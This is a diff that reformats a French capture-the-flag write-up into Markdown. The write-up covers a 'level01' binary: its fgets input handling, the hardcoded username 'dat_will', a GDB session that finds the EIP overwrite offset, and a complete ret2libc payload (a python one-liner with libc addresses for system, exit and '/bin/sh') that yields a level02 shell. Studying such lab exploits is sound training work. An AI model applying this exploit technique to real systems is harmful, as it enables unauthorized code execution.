@@ -1,20 +1,19 @@
-1) Transfert du fichier avec SCP en utilisant un port spécifié :
-    scp -P 22222 level01@localhost:/home/users/level01/level01 .
+- **Lecture des entrées utilisateur avec fgets**  
 
-2) Lecture des entrées utilisateur avec fgets :
+```C
+//Pour le nom d'utilisateur :
+fgets(&a_user_name, 0x100, stdin);
+//Pour le mot de passe :
+fgets((char *)local_54, 100, stdin);
+```  
 
-    Pour le nom d'utilisateur :
-        fgets(&a_user_name, 0x100, stdin);
-    Pour le mot de passe :
-        fgets((char *)local_54, 100, stdin);
-
-3) La comparaison de l'entrée du premier fgets (nom d'utilisateur) est faite avec la chaîne "dat_will". Le nom d'utilisateur correct est donc "dat_will".
-   Cependant, un dépassement de tampon (segfault) est détecté lors de l'entrée du mot de passe, indiquant la possibilité d'une attaque par buffer overflow, la protection NX est aussi désactivée.
+La comparaison de l'entrée du premier fgets (nom d'utilisateur) est faite avec la chaîne "dat_will". Le nom d'utilisateur correct est donc "dat_will".
+Cependant, un dépassement de tampon (segfault) est détecté lors de l'entrée du mot de passe, indiquant la possibilité d'une attaque par buffer overflow, la protection NX est aussi désactivée.
 
 
-4) Utilisation de GDB pour l'analyse de l'application :
+- **Utilisation de GDB pour l'analyse de l'application**  
 
-Etapes du gdb : 
+```bash
 break main
 Breakpoint 1 at 0x80484d5
 (gdb) run
@@ -51,31 +50,35 @@ ds             0x2b	43
 es             0x2b	43
 fs             0x0	0
 gs             0x63	99
-
-Un pattern a été géneré sur zerosum pour avoir l'offet du segfaut. 
+```
+Un pattern a été géneré sur `zerosum` pour avoir l'offet du segfaut. 
 Le registre EIP est écrasé avec la valeur 0x37634136 (7cA6 => 6Ac7, cela correspond à l'offset 80 dans notre pattern), ce qui indique un potentiel exploit par retour à la libc (ret2libc).
 
-5) Construction de la charge utile :
+- **Construction de la charge utile**  
 
-Trouver les adresses des fonctions system, exit et de la chaîne "/bin/sh" dans la bibliothèque C standard (libc) :
+Trouver les adresses des fonctions system, exit et de la chaîne "/bin/sh" dans la bibliothèque C standard (libc) :  
+```bash
     (gdb) p system
     $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
     (gdb) p exit
     $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
     (gdb) find __libc_start_main,+99999999,"/bin/sh"
     0xf7f897ec
+```  
+
+```bash
 python -c 'print "dat_will\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload01
-    cat /tmp/payload01 - | ./level01 
-    ********* ADMIN LOGIN PROMPT *********
-    Enter Username: verifying username....
+cat /tmp/payload01 - | ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
 
-    Enter Password: 
-    nope, incorrect password...
+Enter Password: 
+nope, incorrect password...
 
-    whoami
-    level02
+whoami
+level02
+```  
 
-Ressources :
-- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
-- https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6
-- http://wikisecu.fr/doku.php?id=appsysteme:ret2libc
+**Ressources** :
+[Return to libc (ret2libc) - ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)  
+[Retour à la libc (ret2libc) - WikiSecu](http://wikisecu.fr/doku.php?id=appsysteme:ret2libc)
